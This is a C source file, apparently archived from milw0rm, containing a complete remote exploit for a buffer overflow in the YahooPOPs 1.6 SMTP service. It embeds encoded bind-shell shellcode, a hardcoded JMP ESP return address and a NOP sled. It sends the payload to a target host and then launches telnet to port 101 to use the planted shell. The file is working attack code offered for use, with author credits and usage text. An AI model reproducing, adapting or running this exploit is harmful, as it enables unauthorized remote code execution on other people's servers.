//Diabolic Crab's exploit for YahooPOPs <= 1.6 SMTP
//dcrab@hackerscenter.com
//www.hackerscenter.com
//For more work check out, http://icis.digitalparadox.org
//This was done at 4 am so escuse the messy code if any
//Good job class101 on the windows version ;)

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <netdb.h>
#include <errno.h>
#include <unistd.h>
#include <sys/socket.h>

char scode[] = //Bind shell on port 101, taken from the windows exploit by class101
"\xEB"
"\x0F\x58\x80\x30\x88\x40\x81\x38\x68\x61\x63\x6B\x75\xF4\xEB\x05\xE8\xEC\xFF\xFF"
"\xFF\x60\xDE\x88\x88\x88\xDB\xDD\xDE\xDF\x03\xE4\xAC\x90\x03\xCD\xB4\x03\xDC\x8D"
"\xF0\x89\x62\x03\xC2\x90\x03\xD2\xA8\x89\x63\x6B\xBA\xC1\x03\xBC\x03\x89\x66\xB9"
"\x77\x74\xB9\x48\x24\xB0\x68\xFC\x8F\x49\x47\x85\x89\x4F\x63\x7A\xB3\xF4\xAC\x9C"
"\xFD\x69\x03\xD2\xAC\x89\x63\xEE\x03\x84\xC3\x03\xD2\x94\x89\x63\x03\x8C\x03\x89"
"\x60\x63\x8A\xB9\x48\xD7\xD6\xD5\xD3\x4A\x80\x88\xD6\xE2\xB8\xD1\xEC\x03\x91\x03"
"\xD3\x84\x03\xD3\x94\x03\x93\x03\xD3\x80\xDB\xE0\x06\xC6\x86\x64\x77\x5E\x01\x4F"
"\x09\x64\x88\x89\x88\x88\xDF\xDE\xDB\x01\x6D\x60\xAF\x88\x88\x88\x18\x89\x88\x88"
"\x3E\x91\x90\x6F\x2C\x91\xF8\x61\x6D\xC1\x0E\xC1\x2C\x92\xF8\x4F\x2C\x25\xA6\x61"
"\x51\x81\x7D\x25\x43\x65\x74\xB3\xDF\xDB\xBA\xD7\xBB\xBA\x88\xD3\x05\xC3\xA8\xD9"
"\x77\x5F\x01\x57\x01\x4B\x05\xFD\x9C\xE2\x8F\xD1\xD9\xDB\x77\xBC\x07\x77\xDD\x8C"
"\xD1\x01\x8C\x06\x6A\x7A\xA3\xAF\xDC\x77\xBF\x77\xDD\xB8\xB9\x48\xD8\xD8\xD8\xD8"
"\xC8\xD8\xC8\xD8\x77\xDD\xA4\x01\x4F\xB9\x53\xDB\xDB\xE0\x8A\x88\x88\xED\x01\x68"
"\xE2\x98\xD8\xDF\x77\xDD\xAC\xDB\xDF\x77\xDD\xA0\xDB\xDC\xDF\x77\xDD\xA8\x01\x4F"
"\xE0\xCB\xC5\xCC\x88\x01\x6B\x0F\x72\xB9\x48\x05\xF4\xAC\x24\xE2\x9D\xD1\x7B\x23"
"\x0F\x72\x09\x64\xDC\x88\x88\x88\x4E\xCC\xAC\x98\xCC\xEE\x4F\xCC\xAC\xB4\x89\x89"
"\x01\xF4\xAC\xC0\x01\xF4\xAC\xC4\x01\xF4\xAC\xD8\x05\xCC\xAC\x98\xDC\xD8\xD9\xD9"
"\xD9\xC9\xD9\xC1\xD9\xD9\xDB\xD9\x77\xFD\x88\xE0\xFA\x76\x3B\x9E\x77\xDD\x8C\x77"
"\x58\x01\x6E\x77\xFD\x88\xE0\x25\x51\x8D\x46\x77\xDD\x8C\x01\x4B\xE0\x77\x77\x77"
"\x77\x77\xBE\x77\x5B\x77\xFD\x88\xE0\xF6\x50\x6A\xFB\x77\xDD\x8C\xB9\x53\xDB\x77"
"\x58\x68\x61\x63\x6B\x90";

static char payload[1024];

char jmp[]="\x23\x9b\x02\x10"; //JMP ESP
char jmpebx[]="\xff\xe3"; //JMP EBX

void usage(char* us);
void ver();

 int main(int argc, char *argv[])
 {
     ver();
         char grab[999];
         int sock;
         if (argc<4){
         usage(argv[0]);return -1;
                        }
         int ip=htonl(inet_addr(argv[1])), port, size, x;
         if (argc==3){port=atoi(argv[2]);}
         else port=25;
         struct hostent *aap;
         struct sockaddr_in addr;
         if((aap=(struct hostent *)gethostbyname(argv[1]))==NULL) {
         perror("Gethostbyname()");
         exit(1); }
         if((sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))<0) {
         perror("Socket()");
         exit(1); }
                 addr.sin_family=AF_INET;
                 addr.sin_port=htons(port);
                 memcpy((char *)&addr.sin_addr,(char *)aap->h_addr,aap->h_length);
         if(connect(sock,(struct sockaddr *)&addr,sizeof(addr))!=0) {
         perror("Connect()");
         exit(0); }
                 printf ("[+] Connected\n");
                 fflush(stdin);
                 sleep(2);
                 read(sock,grab,200);
                 printf ("[+] Reading Banner\n");
         if (!strstr(grab,"220 YahooPOPs")) {
         printf("[+] this is not a YahooPOPS server, quitting...\n");
         return -1; }
                 printf ("[+] Found YahooPOP's Server\n");
                 size=508-sizeof(scode);
                 memset(payload,0,sizeof(payload));
                 for (x=0;x<size;x++){strcat(payload,"\x90");}
                 
strcat(payload,scode);strcat(payload,jmp);strcat(payload,jmpebx);
                 printf ("[+] Sending Shellcode\n");
         if (send(sock, payload, strlen(payload), 0) < 0) {
         perror("Send()");
         exit(0); }
                 printf ("[+] Sleep for 3 seconds\n");
                 sleep(3);
                 char hack[100];
                 sprintf (hack, "telnet %s 101", argv[1]);
                 system (hack);
                 return 0;
 }

void usage(char* us)
{
                 printf("Usage: ./dc_ypop ip port\n");
                 printf("The exploit binds a shell to the port 101.\n");
                 return;
}

void ver()
{
                 printf ("################################################################\n");
                 printf ("# Diabolic Crab's Bind Shell Exploit for YahooPOPS <= 1.6 SMTP #\n");
                 printf ("# dcrab@hackerscenter.com www.hackerscenter.com #\n");
                 printf ("# Credits to Behrang Fouladi for finding this bug #\n");
                 printf ("################################################################\n");
}

// milw0rm.com [2004-10-18]
